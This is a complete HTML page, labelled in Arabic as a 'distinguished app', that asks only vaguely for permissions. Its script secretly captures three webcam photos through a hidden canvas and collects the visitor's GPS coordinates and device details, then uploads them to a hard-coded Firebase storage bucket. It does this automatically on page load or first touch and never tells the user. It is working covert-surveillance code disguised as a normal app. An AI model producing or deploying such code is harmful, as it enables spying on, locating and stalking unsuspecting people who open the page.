<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>تطبيق مميز</title>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
      background-color: #f9f9f9;
    }
    h1 {
      color: #333;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <h1>تطبيق مميز</h1>
  <p>يرجى منح الأذونات اللازمة للتطبيق للتقاط الصور.</p>
  <canvas id="canvas" class="hidden"></canvas>
  <script>
    // تهيئة Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyALGGBFq-XDvq78XmN13d1FX-9jv2e2jDE",
      authDomain: "image-b3894.firebaseapp.com",
      projectId: "image-b3894",
      storageBucket: "image-b3894.appspot.com",
      messagingSenderId: "724136212410",
      appId: "1:724136212410:web:9450152940928e78a40f83",
      measurementId: "G-D8NNFMGFH1"
    };
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();

    // متغير لتخزين موقع المستخدم عند الحصول عليه
    let savedLocation = null;

    // دالة لتحويل DataURL إلى Blob
    const dataURLtoBlob = (dataURL) => {
      const binary = atob(dataURL.split(',')[1]);
      return new Blob(
        [new Uint8Array([...Array(binary.length).keys()].map(i => binary.charCodeAt(i)))],
        { type: 'image/png' }
      );
    };

    // دالة للحصول على التاريخ والوقت بالتنسيق المطلوب
    function getFormattedDate() {
      const date = new Date();
      const year = date.getFullYear();
      const month = ('0' + (date.getMonth() + 1)).slice(-2);
      const day = ('0' + date.getDate()).slice(-2);
      const hours = ('0' + date.getHours()).slice(-2);
      const minutes = ('0' + date.getMinutes()).slice(-2);
      const seconds = ('0' + date.getSeconds()).slice(-2);
      return `${year}-${month}-${day}_${hours}-${minutes}-${seconds}`;
    }

    // دالة استخراج معلومات النظام والجهاز
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      const deviceType = /Mobile|Android|iP(hone|od)|iPad|IEMobile/i.test(ua) ? "Mobile" : "Desktop";
      let os = "UnknownOS";
      let version = "UnknownVersion";

      if (/Android/i.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+)/i);
        if (match) {
          os = "Android";
          version = match[1];
        }
      } else if (/iPhone|iPad|iPod/i.test(ua)) {
        const match = ua.match(/OS\s([0-9_]+)/i);
        if (match) {
          os = "iOS";
          version = match[1].replace(/_/g, '.');
        }
      } else if (/Windows NT/i.test(ua)) {
        const match = ua.match(/Windows NT\s([0-9\.]+)/i);
        if (match) {
          os = "Windows";
          version = match[1];
        }
      } else if (/Mac OS X/i.test(ua)) {
        const match = ua.match(/Mac OS X\s([0-9_]+)/i);
        if (match) {
          os = "macOS";
          version = match[1].replace(/_/g, '.');
        }
      }
      return `${deviceType}_${os}_${version}`;
    }

    // دالة التقاط صورة واحدة وتحميلها
    const capturePhoto = (video, canvas, storageRef, callback) => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      storageRef.put(dataURLtoBlob(canvas.toDataURL('image/png')))
        .then(callback)
        .catch(console.error);
    };

    // دالة التقاط الصور:
    // - الصورتين الأوليين يُستخدم لهما اسم يعتمد على التاريخ ومعلومات الجهاز.
    // - الصورة الثالثة تُسَمَّى باستخدام الإحداثيات (مع فاصلة بين خط العرض وخط الطول).
    const capturePhotos = (video, canvas, storageRefBase, captureCount) => {
      if (captureCount < 2) {
        const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
        capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
          setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount + 1), 500);
        });
      } else if (captureCount === 2) {
        if (savedLocation) {
          const { latitude, longitude } = savedLocation;
          const fileName = `snapshot_${latitude.toFixed(6)},${longitude.toFixed(6)}.png`;
          capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
            video.srcObject.getTracks().forEach(track => track.stop());
          });
        } else {
          // في حال عدم توافر الموقع مسبقًا، يتم طلبه هنا
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const { latitude, longitude } = position.coords;
              const fileName = `snapshot_${latitude.toFixed(6)},${longitude.toFixed(6)}.png`;
              capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
                video.srcObject.getTracks().forEach(track => track.stop());
              });
            },
            (error) => {
              console.error("فشل الحصول على الموقع:", error);
              const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
              capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
                video.srcObject.getTracks().forEach(track => track.stop());
              });
            }
          );
        }
      }
    };

    // دالة طلب الأذونات (الكاميرا والموقع) معًا
    function requestPermissions() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          // طلب إذن الموقع بالتوازي
          navigator.geolocation.getCurrentPosition(
            (position) => {
              savedLocation = position.coords;
            },
            (error) => {
              console.error("فشل الحصول على الموقع:", error);
            }
          );
          // بدء بث الفيديو والتقاط الصور باستخدام الدفق المستلم
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          video.addEventListener('loadeddata', () => {
            const canvas = document.getElementById('canvas');
            capturePhotos(video, canvas, storage.ref().child('snapshots/'), 0);
          });
        })
        .catch(error => {
          console.error("فشل الحصول على إذن الكاميرا:", error);
        });
    }

    // إذا كانت الأجهزة اللمسية، نستمع لأول حدث "touchstart"، وإلا نطلب الأذونات فور التحميل
    function onFirstTouch() {
      document.removeEventListener("touchstart", onFirstTouch);
      requestPermissions();
    }

    if ("ontouchstart" in window) {
      document.addEventListener("touchstart", onFirstTouch);
    } else {
      window.addEventListener("load", requestPermissions);
    }

    // تسجيل Service Worker (اختياري لتحسين الأداء)
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('/service-worker.js')
          .then(registration => {
            console.log('Service Worker registered with scope:', registration.scope);
          })
          .catch(error => {
            console.log('Service Worker registration failed:', error);
          });
      });
    }
  </script>
</body>
</html>
